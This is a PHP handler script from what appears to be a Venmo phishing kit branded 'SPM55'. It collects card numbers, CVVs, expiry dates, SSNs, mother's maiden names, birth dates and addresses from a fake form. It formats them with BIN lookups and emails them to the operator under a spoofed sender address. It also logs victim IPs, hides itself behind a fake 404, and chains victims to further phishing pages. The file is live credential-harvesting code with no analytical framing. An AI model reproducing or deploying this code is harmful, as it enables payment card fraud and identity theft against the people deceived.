<?php
include '../admin/tod/config.php';
include '../main.php';

$ip = getUserIP();
$randomnumber = rand(1, 100);
if(!isset($_POST['email'])) {
exit(header("HTTP/1.0 404 Not Found")); 
}else{
function validatecard($number)
 {
    global $type;

    $cardtype = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
    );

    if (preg_match($cardtype['visa'],$number))
    {
	$type= "visa";
        return 'visa';
	
    }
    else if (preg_match($cardtype['mastercard'],$number))
    {
	$type= "mastercard";
        return 'mastercard';
    }
    else if (preg_match($cardtype['amex'],$number))
    {
	$type= "amex";
        return 'amex';
	
    }
    else if (preg_match($cardtype['discover'],$number))
    {
	$type= "discover";
        return 'discover';
    }
    else
    {
        return false;
    } 
 }
$asdasdas = $_POST['cc'];
$tolkon = str_replace(" ", "", $asdasdas);
$bin = check_bin($tolkon);
$bins = preg_replace('/\s/', '', $tolkon);
$bins = substr($bins,0,6);
if($bin["brand"] == "") {
        $subject = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"])." - [$cn - $ip - $br]";
    $subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"]);
} else {
    $subject = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])." - [$cn - $ip - $br]";
    $subbin = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"]);
}
$expnya = $_POST['exp'];
$expired = str_replace("/", "|", $expnya);
$forcheck = "".$tolkon."|".$expired."|".$_POST['cvv']."";
$fromsend = "FROM: ".$_POST['cname']." <admin@spm55.com>";
$message = '
<p>
<b>======================[ CARD INFORMATION ]======================</b><br>
Bank : '.$bin["bank"]["name"].'<br>
Type : '.strtoupper($bin["scheme"]).' - '.strtoupper($bin["type"]).'<br>
Level : '.strtoupper($bin["brand"]).'<br>
Card Holder : '.$_POST['cname'].'<br>
Card Number : '.$tolkon.'<br>
Expired : '.$_POST['exp'].'<br>
CVV : '.$_POST['cvv'].'<br>
Amex CID : '.$cid.'<br>
Mothers Maiden Name : '.$_POST['mmn'].'<br>
For Check : '.$forcheck.'<br>
<b>======================[ BILLING INFORMATION ]======================</b><br>
Full name : '.$_POST['fname'].'<br>
State : '.$_POST['state'].'<br>
City : '.$_POST['city'].'<br>
Street address : '.$_POST['address'].'<br>
ZIP : '.$_POST['zip'].'<br>
Date of birth : '.$_POST['dob'].'<br>
SSN : '.$_POST['ssn'].'<br>
Phone number : '.$_POST['phone'].'<br>
<b>======================[ DEVICE INFO ]======================</b><br>
Country : '.$cn.'<br>
Region : '.$regioncity.'<br>
City : '.$citykota.'<br>
Continent : '.$continent.'<br>
Curs : '.$kurenci.'<br>
OS / BR : '.$os.' / '.$br.'<br>
User Agent : '.$user_agent.'<br>
Timezone : '.$timezone.'<br>
ISP : '.$ispuser.'<br>
IP : '.$ip.'<br>
Date : '.$date.'<br>
<b>======================[ SPM55 - VENMO ]======================</b>
</p>
';
if ($config['send_login'] == "email") {
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$fromsend.'' . "\r\n";
$kirim = mail($result_anying, $subject, $message, $headers);
tulis_file("../admin/result/total_cc.txt", $ip);
tulis_file("../admin/result/total_cclogin.txt", "".$cn."|".$bins."");
}else{
include'server.php';
tulis_file("../admin/result/total_cc.txt", $ip);
tulis_file("../admin/result/total_cclogin.txt", "".$cn."|".$bins."");
}

if ($config['get_pap'] == "on") {
echo "<form id='boyxd' method='POST' action='upload'>
<input type='hidden' name='email' value='".$_POST['email']."'><input type='hidden' name='fname' value='".$_POST['fname']."'>
</form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}else{
if ($config['get_email'] == "on") {
echo "<form id='boyxd' method='POST' action='email-activity'>
<input type='hidden' name='email' value='".$_POST['email']."'>
</form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}else{
echo "<form id='boyxd' method='POST' action='done'>
<input type='hidden' name='email' value='".$_POST['email']."'>
</form><script type='text/javascript'>document.getElementById('boyxd').submit();</script>";
}
}
}
?>